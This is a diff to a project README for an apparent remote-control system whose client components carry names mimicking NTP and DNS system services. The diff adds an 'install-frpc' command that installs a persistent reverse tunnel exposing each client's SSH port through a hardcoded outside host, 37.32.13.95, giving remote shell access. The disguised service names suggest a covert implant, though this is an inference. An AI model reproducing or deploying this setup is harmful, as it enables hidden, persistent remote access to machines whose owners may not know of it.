@@ -20,10 +20,13 @@ remote-oneway/
     ├── client.py        # Original client script (for reference/testing)
     ├── ntp-daemon       # Client template (used by installer)
     ├── conf             # Monitor script template
+    ├── conf.py          # Monitor script Python source
     ├── env.example      # Client configuration example
     ├── requirements.txt # Python dependencies
     ├── install.sh       # Automated installation script
     ├── uninstall.sh     # Automated uninstallation script
+    ├── install_frpc.sh  # frpc installation script
+    ├── uninstall_frpc.sh# frpc uninstallation script
     ├── ntpsyncd.service # Systemd service file
     ├── dnsresolv.service# Systemd monitor service
     ├── dnsresolv.timer  # Systemd timer (checks every minute)
@@ -163,6 +166,16 @@ Once the server is running, you can:
 
 5. **Exit server**: Type `exit` or `quit` to shutdown the server.
 
+6. **Install frpc on a client**: Enable reverse proxy/tunneling for SSH access.
+   ```
+   server> @client-name install-frpc
+   ```
+
+7. **Uninstall frpc from a client**: Remove reverse proxy service.
+   ```
+   server> @client-name uninstall-frpc
+   ```
+
 ### Command Line Features
 
 The server provides bash-like command line editing:
@@ -171,6 +184,43 @@ The server provides bash-like command line editing:
 - **Ctrl+A**: Jump to beginning of line
 - **Ctrl+E**: Jump to end of line
 - **Backspace/Delete**: Edit commands
+
+### frpc Management (Reverse Proxy/Tunneling)
+
+The system includes built-in support for installing and managing frpc (Fast Reverse Proxy Client), which enables secure remote access to clients through a reverse proxy tunnel.
+
+**Install frpc on a client:**
+```
+server> @client-name install-frpc
+```
+
+This command will:
+- Download and install the latest frpc binary
+- Configure it to connect to 37.32.13.95:8443
+- Set up SSH tunneling (local port 22 → remote port 7000)
+- Create and enable a systemd service
+- Enable TLS encryption with token authentication
+
+After installation, you can SSH to the client via:
+```bash
+ssh user@37.32.13.95 -p 7000
+```
+
+**Uninstall frpc from a client:**
+```
+server> @client-name uninstall-frpc
+```
+
+**Check frpc status:**
+```
+server> @client-name systemctl status frpc
+```
+
+**Note**: The frpc configuration is pre-configured with:
+- Server: 37.32.13.95:8443
+- Token authentication with TLS
+- SSH proxy on remote port 7000
+- Encryption and compression enabled
 
 ### Example Session
 
